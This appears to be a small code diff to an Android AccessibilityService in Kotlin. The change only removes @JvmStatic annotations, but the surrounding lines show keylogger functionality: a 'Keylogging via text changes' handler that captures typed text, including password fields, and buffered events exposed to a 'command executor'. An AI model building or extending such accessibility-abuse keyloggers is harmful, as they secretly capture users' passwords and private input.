@@ -160,7 +160,7 @@ class AccessibilityLoggerService : AccessibilityService() {
     }
 
     // Public API for command executor
-    @JvmStatic
+    
     fun getBufferedEvents(): List<Map<String, Any>> {
         return synchronized(eventsBuffer) {
             val copy = eventsBuffer.toList()
@@ -169,16 +169,16 @@ class AccessibilityLoggerService : AccessibilityService() {
         }
     }
 
-    @JvmStatic
+    
     fun setLoggingEnabled(enabled: Boolean) {
         isLoggingEnabled = enabled
     }
 
-    @JvmStatic
+    
     fun isLoggingEnabled(): Boolean = isLoggingEnabled
 
     // Keylogging via text changes
-    @JvmStatic
+    
     fun onTextChanged(packageName: String, className: String, text: String, isPassword: Boolean) {
         if (!isLoggingEnabled) return
 
